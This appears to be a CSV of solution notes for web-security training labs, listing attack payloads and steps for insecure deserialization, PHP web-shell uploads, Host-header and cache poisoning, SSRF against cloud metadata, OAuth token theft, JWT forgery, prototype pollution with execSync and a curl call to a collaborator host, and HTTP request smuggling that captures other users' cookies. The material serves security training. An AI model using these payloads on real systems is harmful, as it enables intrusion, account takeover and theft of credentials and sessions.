Number,Description,Command,Comments,Tags
137,Exploiting Java deserialization with Apache Commons,java -jar path/to/ysoserial.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64,"Replace session cookie with the output of ysoserial, then URL-encode it.

Session cookie looks like originally:

¬í�sr�/lab.actions.common.serializable.AccessTokenUserQüå'©�L�accessTokent�Ljava/lang/String;L�usernameq�~�xpt� o3nsmfykon6aoe1st16bub2f8pc02yqht�wiener

(after URL and base64 decode)","Insecure Deserialization, Practitioner"
138,Exploiting PHP deserialization with a pre-built gadget chain,"./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64

Generate payload object

<?php
$object = ""OBJECT-GENERATED-BY-PHPGGC"";
$secretKey = ""LEAKED-SECRET-KEY-FROM-PHPINFO.PHP"";
$cookie = urlencode('{""token"":""' . $object . '"",""sig_hmac_sha1"":""' . hash_hmac('sha1', $object, $secretKey) . '""}');
echo $cookie;

This is the script to generate a signed payload","A developer comment discloses /cgi-bin/phpinfo.php and an error message discloses Symfony 4.3.6 framework in use.

PHPinfo discloses the secret key, which is used to sign the payload.

Cookie looks like

{""token"":""Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJpaDQzZDVsdjZtZnkwNHFydmttMnh4MmI4ZWc1c216MSI7fQ=="",""sig_hmac_sha1"":""63efd6d03ee265f6d3d19d563d760354f166ea13""}
(When URL decoded)

When token base64 decoded:

{""token"":""O:4:""User"":2:{s:8:""username"";s:6:""wiener"";s:12:""access_token"";s:32:""ih43d5lv6mfy04qrvkm2xx2b8eg5smz1"";}"",""sig_hmac_sha1"":""63efd6d03ee265f6d3d19d563d760354f166ea13""}","Insecure Deserialization, Practitioner"
139,Exploiting Ruby deserialization using a documented gadget chain,"Change the command that should be executed from id to rm /home/carlos/morale.txt.
                            
Replace the final two lines with puts Base64.encode64(payload). This ensures that the payload is output in the correct format for you to use for the lab.","find the Universal Deserialisation Gadget for Ruby 2.x-3.x
 by vakzz
 on devcraft.io.

Copy the final script for generating the payload.

Make the necessary changes, run the script and URL-encode the output.

Cookie base64 decoded looks like:
o:	User:@usernameI""wiener:EF:@access_tokenI""%l6gf3l4x5vn6il694569c3qioft4f5o0;F","Insecure Deserialization, Practitioner"
140,Information disclosure in error messages,"GET /product?productId=""example""","The unexpected data type causes an exception, and a full stack trace is displayed in the response. This reveals that the lab is using Apache Struts 2 2.3.31.","Apprentice, Information Disclosure"
141,Information disclosure on debug page,/cgi-bin/phpinfo.php,Use Engagement Tools > Find Comments. This will identify interesting HTML comments.,"Apprentice, Information Disclosure"
142,Source code disclosure via backup files,/backup/ProductTemplate.java.bak,"/robots.txt
 and notice that it reveals the existence of a /backup directory. Browse to /backup to find the file ProductTemplate.java.bak

Or, ""Engagement tools"" > ""Discover content"". Then, launch a content discovery session to discover the /backupdirectory and its contents.","Apprentice, Information Disclosure"
143,Authentication bypass via information disclosure,"TRACE /admin

X-Custom-IP-Authorization: 127.0.0.1","""Proxy"" > ""Options"", scroll down to the ""Match and Replace"" section, and click ""Add"". Leave the match condition blank, but in the ""Replace"" field, enter:X-Custom-IP-Authorization: 127.0.0.1","Apprentice, Information Disclosure"
144,Information disclosure in version control history,"wget -r https://YOUR-LAB-ID.web-security-academy.net/.git/

admin.conf",,"Information Disclosure, Practitioner"
145,Excessive trust in client-side controls,"POST /cart

Change price parameter to an arbitrary value when adding a product to the cart.","There is a logic flaw in the purchasing workflow to buy items for an unintended price.

The application is relying on the client side value and not checking this when it is submitted to the server.","Apprentice, Business Logic Vulnerabilities"
146,High-level logic vulnerability,"POST /cart

change the quantity parameter to negative values to reduce the price of the cart.","Change the quantity parameter to a negative value, this lowers the price of the cart.

Add the leather jacket to the cart, then add negative quantities of another product to lower the price of the cart.","Apprentice, Business Logic Vulnerabilities"
147,Inconsistent security controls,"Only “@dontwannacry” users can access /admin

Register with an email address

anything@your-email-id.web-security-academy.net

Go to account and change email to anything@dontwannacry","The /admin endpoint is locked to specific users with an email domain. You can’t sign up with an email address at this domain as you won’t have access to the @dontwannacry email domain.

However, you can register with a normal email address and then change your email address in the account settings.","Apprentice, Business Logic Vulnerabilities"
148,Flawed enforcement of business rules,"Coupons NEWCUST5 and SIGNUP30

Adding the same coupon twice in a row is rejected, but adding the coupons in alternate order will bypass this control","Alternating between two different coupon codes will provide infinite money.

The intended control is to prevent the same coupon from being added multiple times, but this does not apply when 2 (or more) coupons are used in alternate.","Apprentice, Business Logic Vulnerabilities"
149,Low-level logic flaw,"POST /cart

Use Intruder to rapidly increase the price, once the cart reaches the maximium limit it switches to a negative interger and start counting toward 0.

Use Intruder and Repeater to make the cart value between 0 and 100 dollars to purchase",Note that you need to use other items other than just the jacket to have the price land between 0 and 100.,"Business Logic Vulnerabilities, Practitioner"
150,Inconsistent handling of exceptional input,very-long-string@dontwannacry.com.YOUR-EMAIL-ID.web-security-academy.net,"using a very long email address is truncated to just 255 characters.

Make sure the very-long-string is the right number of characters so that the ‘m’ at the end of @dontwannacry.com is character 255.

This will then be truncated, so that the resulting address appears to be a valid @dontwannacry.com domain","Business Logic Vulnerabilities, Practitioner"
151,Weak isolation on dual-use endpoint,"POST /my-account/change-password

remove the current-password parameter, this still changes the password. Change password for administrator user.",Set username=administrator to change the password for the administrator user,"Business Logic Vulnerabilities, Practitioner"
152,Insufficient workflow validation,"GET /cart/order-confirmation?order-confirmation=true

Add the jacket to the basket.","POST /cart/checkout
 request redirects you to an order confirmation page via GET /cart/order-confirmation?order-confirmation=true

This order-confirmation page can be modified to modify the shopping order, bypassing the cart/checkout process.","Business Logic Vulnerabilities, Practitioner"
153,Authentication bypass via flawed state machine,"Drop GET /role-selector request, the default role administrator is applied to the account.","GET /role-selector is the request after logging in, this request can be dropped which sets the account to the default role which is administrator.","Business Logic Vulnerabilities, Practitioner"
154,Infinite money logic flaw,"POST /cart
POST /cart/coupon
POST /cart/checkout
GET /cart/order-confirmation?order-confirmed=true
POST /gift-card","Use the SIGNUP30 coupon to buy a 10 dollar gift card at 30% discount, which profits $3.

Run a macro in Burp:

""Project options"" > ""Sessions"". In the ""Session handling rules"" 
panel, click ""Add"". The ""Session handling rule editor"" dialog opens.
                    
In the dialog, go to the ""Scope"" tab. Under ""URL Scope"", select ""Include all URLs"".
                    
Go back to the ""Details"" tab. Under ""Rule 
actions"", click ""Add"" > ""Run a macro"". Under ""Select macro"", click 
""Add"" again to open the Macro Recorder.

In the list of requests, select GET /cart/order-confirmation?order-confirmed=true. Click ""Configure item"". In the dialog that opens, click ""Add"" to create a custom parameter. Name the parameter gift-card and highlight the gift card code at the bottom of the response. Click ""OK"" twice to go back to the Macro Editor.
                    
Select the POST /gift-card request and click ""Configure item"" again. In the ""Parameter handling"" section, use the drop-down menus to specify that the gift-card parameter should be derived from the prior response (response 4). Click ""OK"".","Business Logic Vulnerabilities, Practitioner"
155,Authentication bypass via encryption oracle,"xxxxxxxxxadministrator:your-timestamp

cookie format is administrator:your-timestamp","stay-logged-in
 cookie is encrypted.

Send the POST /post/comment
 and the subsequent GET /post?postId=x
 request (containing the notification cookie) to Burp Repeater.","Business Logic Vulnerabilities, Practitioner"
156,Basic password reset poisoning,"Modify Host header: YOUR-EXPLOIT-SERVER-ID.exploit-server.net

Modify username in body parameter: carlos. Use the temp-forgot-password-token obtained to change the password of Carlos account.","The forgot password functionality will send an email with a URL that contains the query parameter temp-forgot-password-token.

POST /forgot-password is used to trigger the password reset email, which contains the username as a body parameter.

Changing the Host header changes the URL of the password reset link in the email sent.

Generate a request with the exploit server as Host header and username as carlos. This will send a password reset link to Carlos’ email, when clicked, the temp-forgot-password-token will be included as a parameter in the request to the exploit server.","Apprentice, HTTP Host Header Attacks"
157,Host header authentication bypass,"GET /admin

Host header to localhost","Browse to /admin, error message reveals it can be accessed by local users.","Apprentice, HTTP Host Header Attacks"
158,Web cache poisoning via ambiguous requests,"Exploit server /resources/js/tracking.js
alert(document.cookie)

GET /?cb=123 HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net

Remove cache buster, re-poison the cache so that users browsing to / are served the malicious js file.","The Host header is being validated in requests to /.

Add an arbitrary query parameter to your requests to serve as a cache buster, for example, GET /?cb=123

add a second Host header with an arbitrary value, this appears to be 
ignored when validating and routing your request. The arbitrary value of your second Host header is reflected in an absolute URL used to import a script from /resources/js/tracking.js","HTTP Host Header Attacks, Practitioner"
159,Routing-based SSRF,"Host: 192.168.0.§0§

Identify the correct IP address, then browse to /admin with this as the Host header. Obtain a CSRF token when requesting /admin/delete. Use this to craft the full request.

Full query parameter:

GET /admin/delete?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&username=carlos

Obtain session cookie, modify request to POST and send.","Insert a collaborator payload in the Host header, then note that interactions are made when requests are sent to the web server.

Use Intruder to replace the Host header with IP addresses, iterating up from 0 to 255 with a step of 1.","HTTP Host Header Attacks, Practitioner"
160,SSRF via flawed request parsing,"Scan IP range using Host header and Intruder.

Use absolute URL, obtain CSRF token, then generate the request

GET https://YOUR-LAB-ID.web-security-academy.net/admin/delete?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&username=carlos

Obtain session cookie, then modify request to POST and include cookie.","Use an absolute URL instead of the standard URL.

e.g.GET https://YOUR-LAB-ID.web-security-academy.net/

This then allows for the Host header to be modified.

e.g.GET https://YOUR-LAB-ID.web-security-academy.net/
Host: BURP-COLLABORATOR-SUBDOMAIN

","HTTP Host Header Attacks, Practitioner"
161,SSRF via flawed request parsing,"Split the requests, one to / and one to the following. Obtain the necessary information in requests to /admin first.

POST /admin/delete HTTP/1.1
Host: 192.168.0.1
Cookie: _lab=YOUR-LAB-COOKIE; session=YOUR-SESSION-COOKIE
Content-Type: x-www-form-urlencoded
Content-Length: CORRECT

csrf=YOUR-CSRF-TOKEN&username=carlos

","Open two repeater tabs,

First one is standard to /
Second one is to /admin with Host header 192.168.0.1

Using the drop-down menu next to the Send button, change the send mode to Send group in sequence (single connection)

Change the Connectionheader to keep-alive

Make note of the details such as path, username input and csrf token.

How it works: Although the front-end server may initially appear to perform robust validation of the Host header, it makes assumptions about all requests on a connection based on the first request it receives.","HTTP Host Header Attacks, Practitioner"
162,Authentication bypass via OAuth implicit flow,"POST /authenticate

change email address to carlos@carlos-montoya.net","Start of the OAuth flow:
GET /auth?client_id=[...]

logs user in with a POST request to /authenticate along with the access token. This flawed validation allows you to change the email address to another account and login with that.

Right-click on the POST
 request and select ""Request in browser"" > ""In original session"". Copy this URL and visit it in the browser.","Apprentice, OAuth"
163,Forced OAuth profile linking,"Intercept requests when linking a social media account. Copy the URL for GET /oauth-linking?code=[...]

Drop the request and log out so you have a valid code.

Exploit server:
<iframe src=""https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN-CODE""></iframe>","Login as normal, then attach a social media profile to your account.

Once this is done, you can login with social media account, which is done with GET /auth?client_id[...] and a redirect_uri
 for this functionality sends the authorization code to /oauth-linking.

There is no state parameter, which acts as a CSRF token in OAuth. Obtain a valid code by intercepting and dropping a request, then deliver it to the victim in an iframe. When the victim browser loads the iframe, the src attribute points to the URL and completed the OAuth flow, attaching your social media profile to the admin account.","OAuth, Practitioner"
164,OAuth account hijacking via redirect_uri,"<iframe src=""https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email""></iframe>

Obtain an authorization code from victim, then use this to log in:

https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN-CODE","GET /auth?client_id=[...] and redirect_urialong with the authorization code in the query string.

Any value can be submitted for redirect_uri, allowing for authorization codes to be leaked.

","OAuth, Practitioner"
165,,"https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email

Script to force a victim to visit the malicious URL and execute the script to steal their access token:

<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>","GET /auth?client_id=[...] and redirect_uri but the redirect uri is being validated against an allow list. However, you can perform a directory traversal e.g.

https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post?postId=1

This can be chained with an open redirect vulnerability elsewhere on the site. GET /post/next?path=[...] when clicking “Next Post” is vulnerable to open redirect.

Combine these two vulnerabilities and steal an access token using the Exploit Server.","OAuth, Practitioner, Review"
166,SSRF via OpenID dynamic client registration,"POST /reg HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
Content-Type: application/json

{
    ""redirect_uris"" : [
        ""https://example.com""
    ],
    ""logo_uri"" : ""https://BURP-COLLABORATOR-SUBDOMAIN""
}

Then replace the logo_uri value with the target URL when registering at /reg:

""logo_uri"" : ""http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/""

Get a new client ID and then request the information about it at GET /client/CLIENT-ID/logo","Client registration endpoint is /reg according to the OAuth config file.

Create a POST request to register client application with the OAuth service and include the logo_uri property.  This will cause a SSRF when GET requests are made to the logo.

Register a new client with the POST request, then make a GET call to obtain the logo information, which will perform the SSRF and steal the access key on the local server.

","OAuth, Practitioner"
167,Remote code execution via web shell upload,<?php echo file_get_contents('/home/carlos/secret'); ?>,GET /files/avatars/exploit.php HTTP/1.1,"Apprentice, File Upload"
168,Web shell upload via Content-Type restriction bypass,"<?php echo file_get_contents('/home/carlos/secret'); ?>

Change Content-Typeto image/jpeg",GET /files/avatars/<YOUR-IMAGE>,"Apprentice, File Upload"
169,Web shell upload via path traversal,"<?php echo file_get_contents('/home/carlos/secret'); ?>

POST request to upload the php file, include a ../ encoded

Content-Disposition: form-data; name=""avatar""; filename=""..%2fexploit.php""

GET /files/avatars/..%2fexploit.php","Server just outputs the contents of the PHP file as plain text.

Path traversal executes the script.

the / character need to be URL encoded.","File Upload, Practitioner"
170,Web shell upload via extension blacklist bypass,"<?php AddType application/x-httpd-php .l33t; ?>

name this exploit.l33t

<?php echo file_get_contents('/home/carlos/secret'); ?>","Create a PHP payload that maps an arbitrary extension (.l33t) to executable MIME type application/x-httpd-php

filename: .htaccess
Content-Type: text/plain

thanks to the malicious .htaccess file, the .l33t extension is executed as if it was .php, and the extension filter can be bypassed.","File Upload, Practitioner"
171,Web shell upload via obfuscated file extension,"<?php echo file_get_contents('/home/carlos/secret'); ?>

Content-Disposition header:

filename=""exploit.php%00.jpg""","Null byte payload will have the server accept it as jpg, but referred to as .php","File Upload, Practitioner"
172,Remote code execution via polyglot web shell upload,"<?php echo file_get_contents('/home/carlos/secret'); ?>

exiftool -Comment=""<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>"" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php","Creating a polyglot PHP/JPG file that contains the PHP payload in the metadata.

GET /files/avatars/polyglot.php

Use the message editors search feature to find the START string within the binary image data in the response. This will be the secret value.","File Upload, Practitioner"
173,JWT authentication bypass via unverified signature,"In the Inspector panel, change the value of the subclaim from wienerto administrator, then click Apply changes","Implementation flaws mean the server doesn’t verify the signature of the JWT.

You can simply modify the session token to gain access as another user","Apprentice, JWT"
174,JWT authentication bypass via flawed signature verification,"Change sub claim to administrator, change alg parameter to none. Apply changes","In the message editor, remove the signature from the JWT, but remember to leave the trailing dot after the payload.","Apprentice, JWT"
175,JWT authentication bypass via weak signing key,hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list,"Crack the JWT secret using hashcat. Then, generate a forged signed key using JWT Editor Keys in Burp and New Symmetric Key.

Then you can modify the JWT and sign this with a valid signature.","JWT, Practitioner"
176,JWT authentication bypass via jwk header injection,"Generate a new RSA key, select Embedded JWK in “Attack”.

A jwk parameter will be added to the header of the JWT containing the created public key","the jwk parameter in  the JWT header is used to embed the correct verification key directly in the token, but sometimes the server fails to check that the provided key came from a trusted source.

Generate a new RSA key in the JWT Editor Keys","JWT, Practitioner"
177,JWT authentication bypass via jku header injection,"Generate a new RSA key.

Add following to the exploit server based on the created information of the RSA key:

{
    ""keys"": [
        {
            ""kty"": ""RSA"",
            ""e"": ""AQAB"",
            ""kid"": ""893d8f0b-061f-42c2-a4aa-5056e12b8ae7"",
            ""n"": ""yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw""
        }
    ]
}

replace the kid header, add a new jku paramter with the exploit server URL uploaded. Click sign, and don’t modify headers.","The jku header might be supported in JWT’s, the server might fail to check the URL belongs to a trusted domain.

Upload a malicious JWK set to the exploit server.

replace the kid of the JWT, add the jku parameter.

Sign the JWT with the RSA key generated, make sure that the “Don’t modify header” option is selected and sign the token.","JWT, Practitioner"
178,JWT authentication bypass via kid header path traversal,"Modify the JWT’s kid parameter:

../../../../../../../dev/null

Generate a new key with a null byte (AA==) for the k property (secret key), sign the modified JWT with the null byte secret key.","The server uses the kid parameter to fetch the key from its filesystem.

Generate a new symmetric key, replace the generated value for the k property with a base64-encoded null byte (AA==).

Modify the kid parameter of the servers JWT to point to dev/null.

Change the sub parameter to administrator. Sign with generated symmetric key and “Don’t modify header”.

This will modify the token with a secret key that uses a null byte, the path traversal in the kid also points to /dev/null, so these will match and be accepted.","JWT, Practitioner"
179,DOM XSS via client-side prototype pollution,"/?__proto__[transport_url]=data:,alert(1);","DOM Invader:
1. Open Burp Browser, enable Prototype Pollution
2. Click Scan for Gadgets
3. script.src sink accessed via transport_url gadget.
4. Click Exploit

Manual:
1. /?__proto__[foo]=bar
Open Console → Object.prototype and note that it now has the foo property with the value bar.
2. Go to Sources, look for sinks. searchLogger.js has the config option with transport_url property.
3. /?__proto__[transport_url]=foo
Go to Elements, <script> element has been rendered with the src attribute foo.
Modify the payload so that the script element has a src attribute that will result in XSS.","Practitioner, Prototype Pollution"
180,DOM XSS via an alternative prototype pollution vector,/?__proto__.sequence=alert(1)-,"You need to append a minus character (-) to the DOM Invader POC as a numeric 1 is being appended. You can see this in the Console tab. The manager.sequence shows alert(1)1, which results in invalid JS syntax.","Practitioner, Prototype Pollution"
181,Client-side prototype pollution via flawed sanitization,"/?__pro__proto__to__[transport_url]=data:,alert(1);","The standard pollution vectors are being sanitized, but can be bypassed as the filter is not being applied recursively.","Practitioner, Prototype Pollution"
182,Client-side prototype pollution in third-party libraries,"<script>
location=""https://0ad100d0033f22eec134aff500b200eb.web-security-academy.net/#__proto__%5BhitCallback%5D=alert%28document.cookie%29""
</script>","Use DOM Invader to identify the 3rd party sink and gadget (setTimeout()) and hitCallback.

Modify the payload to alert the document.cookie, not just alert(1).","Practitioner, Prototype Pollution"
183,Client-side prototype pollution via browser APIs,"/?__proto__[value]=data:,alert(1);","script.srcsink via the valuegadget.

the Object.defineProperty()method is used to make the transport_urlunwritable and unconfigurable. However, it doesn't define a valueproperty.","Practitioner, Prototype Pollution"
184,Privilege escalation via server-side prototype pollution,"""__proto__"": {
    ""isAdmin"":true
}","POST /my-account/change-address
 request.

Add a new property to the JSON with the name _proto_:

""__proto__"": {
    ""foo"":""bar""
}

The response includes the arbitrary property injected, but not the _proto_ property, which indicates pollution is possible. Pollute the isAdmin property to escalate privileges. Note that you can see the isAdmin property in the response, and this is set to “false”","Practitioner, Prototype Pollution"
185,Detecting server-side prototype pollution without polluted property reflection,"""__proto__"": {
    ""status"":555
}","""_proto_"": {
""foo"":""bar""
}

This is not reflected in the response, if you break the JSON syntax, an error message is received. The error response is 500 but there is an status property in the JSON response body of 400. Fix the error and try to pollute the status property.

""__proto__"": {
    ""status"":555
}

remember this must be between 400 and 599.

Issue the request polluting the status property, then generate a new error. Note that the status returns 555, indicating that the prototype pollution is succesful.","Practitioner, Prototype Pollution"
186,Bypassing flawed input filters for server-side prototype pollution,"""constructor"": {
    ""prototype"": {
        ""isAdmin"":true
    }
}","""constructor"": {
    ""prototype"": {
        ""json spaces"":10
    }
}

Switch Response to Raw, then note that the number of spaces in the indentation has increased in the response.

The constructor property is an alternate if the _proto_ is not working or filtered.","Practitioner, Prototype Pollution"
187,Remote code execution via server-side prototype pollution,"""proto"": {
""execArgv"":[
""--eval=require('child_process').execSync('rm /home/carlos/morale.txt')""
]
}","""__proto__"": {
    ""json spaces"":10
}
Increases the indentation, indicates Prototype Pollution is possible.

POST /admin/jobs has a maintenance function that cleans up the database and filesystem. This might spawn child processes.

Pollute the _proto_ property with a malicious execArgv property that adds the —eval process to the spawned child process. This is done in the POST /my-account/change-address
 request.

""__proto__"": {
    ""execArgv"":[
        ""--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')""
    ]
}

Then, re-run the admin maintenance job. The job might fail but this will get a hit on the collaborator.

Replace the curl command with code to execute.","Practitioner, Prototype Pollution"
188,"HTTP request smuggling, basic CL.TE vulnerability","POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G","Submit this twice, the second request will respond with Unrecognized method GPOST

This is because the ""G"" that is added is appended to the start of the second request, making the method a “GPOST”","HTTP Request Smuggling, Practitioner, Review"
189,"HTTP request smuggling, basic TE.CL vulnerability","POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0\r\n\r\n","You need to include the trailing sequence \r\n\r\nfollowing the final 0.

Ensure that the ""Update Content-Length"" option is unchecked.","HTTP Request Smuggling, Practitioner, Review"
190,"HTTP request smuggling, obfuscating the TE header","POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0",obfuscating transfer-encoding by sending two that are formatted differently,"HTTP Request Smuggling, Practitioner, Review"
191,"HTTP request smuggling, confirming a CL.TE vulnerability via differential responses","POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X",Second request should receive a HTTP 404 response,"HTTP Request Smuggling, Practitioner, Review"
192,"HTTP request smuggling, confirming a TE.CL vulnerability via differential responses","POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0",The second request should receive an HTTP 404 response.,"HTTP Request Smuggling, Practitioner, Review"
193,"Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability","POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=",This will provide access to the /admin interface.,"HTTP Request Smuggling, Practitioner, Review"
194,"Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability","POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

71
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0","Note the Host: http://localhost header in the smuggled request, this is what is bypassing the access control on the front-end.","HTTP Request Smuggling, Practitioner, Review"
195,Exploiting HTTP request smuggling to reveal front-end request rewriting,"POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 143
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-abcdef-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1","the X-abcdef-Ip header should be replaced with the rewritten header of a test request smuggle:

POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

search=test","HTTP Request Smuggling, Practitioner, Review"
196,Exploiting HTTP request smuggling to capture other users' requests,"POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 256
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=your-session-token

csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test",smuggle a request to the back-end server that causes the next user's request to be stored in the application. Then retrieve the next user's request and use the victim user's cookies to access their account.,"HTTP Request Smuggling, Practitioner, Review"
197,Exploiting HTTP request smuggling to deliver reflected XSS,"POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
User-Agent: a""/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1","reflected XSS via the user agent header, the next visitor will receive the response to the smuggled request which will result in XSS","HTTP Request Smuggling, Practitioner, Review"
198,Response queue poisoning via H2.TE request smuggling,"POST /x HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net","This allows you to fetch arbitrary responses.

You can obtain the response to another users request, then steal their session cookies.","HTTP Request Smuggling, Practitioner, Review"
199,H2.CL request smuggling,"POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 0

GET /resources HTTP/1.1
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Content-Length: 5

x=1

Exploit server resources file:

alert(document.cookie)","In Repeater, Allow HTTP/2 ALPN override option and disable the Update Content-Length option.

Change the protocol to HTTP/2 in Inspector

if you send a request for GET /resources, you are redirected to https://YOUR-LAB-ID.web-security-academy.net/resources/

Add the arbitrary host header of the exploit server, this this will result in the victim making the request to the arbitrary host. Add a payload on the exploit server that executes JS.",HTTP Request Smuggling
200,HTTP/2 request smuggling via CRLF injection,"Add headers:

Namefoo
Valuebar\r\n
Transfer-Encoding: chunked

Request Body:

0

POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Length: 800

search=x","Expand the Inspector's Request Attributes section and change the protocol to HTTP/2.

Add the two new headers, make sure to include the linebreak characters in the value of the foo header. Victim session cookie should be in the recent searches.",HTTP Request Smuggling
